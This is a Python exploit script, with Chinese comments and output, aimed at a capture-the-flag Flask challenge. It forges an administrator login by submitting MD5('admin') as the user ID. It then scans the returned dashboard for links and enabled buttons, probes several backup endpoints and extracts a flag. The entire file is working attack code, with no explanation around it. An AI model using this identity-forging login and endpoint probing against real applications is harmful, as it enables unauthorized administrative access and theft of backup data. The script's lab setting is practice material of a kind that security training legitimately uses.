import requests
import hashlib
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 真正的管理员登录")
print(f"[*] Target: {BASE_URL}")
print()

# 用 MD5('admin') 的 UID 登录
admin_uid = hashlib.md5("admin".encode()).hexdigest()
print(f"[*] 尝试用 MD5('admin') 登录")
print(f"    MD5('admin') = {admin_uid}")

# POST 登录
login_resp = session.post(f"{BASE_URL}/login", data={"uid": admin_uid})
print(f"    POST /login: {login_resp.status_code}")

# 保存响应
with open("dashboard_admin.html", "w", encoding="utf-8") as f:
    f.write(login_resp.text)
print(f"    [+] 保存到 dashboard_admin.html")

# 分析响应
print(f"\n[*] 响应分析:")

if "Administrator" in login_resp.text:
    print(f"    [!!!] 找到 Administrator 角色!")
    print(f"    [!!!] 可能获得管理员权限!")

if "Standard User" in login_resp.text:
    print(f"    [-] Standard User")

# 检查备份相关
if "backup" in login_resp.text.lower():
    print(f"    [+] 发现 backup 关键词!")

# 提取所有链接
links = re.findall(r'href=["\']([^"\']+)["\']', login_resp.text)
if links:
    print(f"    [!] 链接: {links}")

# 提取所有按钮
buttons = re.findall(r'<button[^>]*>([^<]+)</button>', login_resp.text)
if buttons:
    print(f"    [!] 按钮: {buttons}")

# 检查 disabled 属性
disabled_buttons = re.findall(r'<button[^>]*disabled[^>]*>([^<]+)</button>', login_resp.text)
if not disabled_buttons:
    print(f"    [!!!] 所有按钮都启用了! 可能可以访问备份!")
else:
    print(f"    [-] 仍有禁用按钮: {disabled_buttons}")

# 尝试访问备份
print(f"\n[*] 尝试访问备份接口")
backup_paths = ["/backup", "/admin/backup", "/api/backup"]
for path in backup_paths:
    backup_resp = session.get(f"{BASE_URL}{path}")
    if backup_resp.status_code != 404:
        print(f"    [!!!] {path}: {backup_resp.status_code}")
        print(f"    {backup_resp.text[:500]}")
        
        if "flag" in backup_resp.text.lower():
            print(f"    [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', backup_resp.text, re.IGNORECASE)
            if flag_match:
                print(f"    [!!!] Flag: {flag_match.group()}")

print()
print("[*] 完成!")
